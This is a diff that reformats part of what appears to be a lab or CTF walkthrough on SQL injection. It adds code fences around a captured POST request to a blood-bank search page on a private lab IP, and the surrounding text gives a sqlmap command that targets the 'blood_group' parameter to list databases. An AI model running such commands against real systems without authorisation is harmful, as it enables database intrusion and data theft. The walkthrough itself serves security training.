@@ -242,9 +242,9 @@ First, we need to identify the vulnerable POST request and save it. In order to 
 
 You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
 
-SavedHTTPPOST request
+Saved HTTPPOST request:
 
-
+```
 nare@nare$ cat req.txt
 POST /blood/nl-search.php HTTP/1.1
 Host: 10.10.17.116
@@ -262,10 +262,8 @@ Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
 Connection: close
 
 blood_group=B%2B
+```
 
-
-  
-  
 Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
   
 sqlmap -r req.txt -p blood_group --dbs
